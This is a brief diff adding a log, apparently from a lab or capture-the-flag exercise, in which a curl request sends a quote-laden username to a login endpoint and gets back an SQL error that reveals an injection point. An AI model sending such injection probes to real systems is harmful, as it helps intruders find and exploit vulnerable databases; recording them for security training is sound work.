@@ -1,0 +1,8 @@
+$ curl -s -i -X POST http://phantomcorp/portal/login --data "user=admin'&pass=x"
+
+HTTP/1.0 200 OK
+Server: PhantomClientes/2.0 
+Date: Wed, 18 Nov 2026 20:53:00 GMT
+Content-Type: text/plain
+
+Error SQL: unrecognized token: "x'"
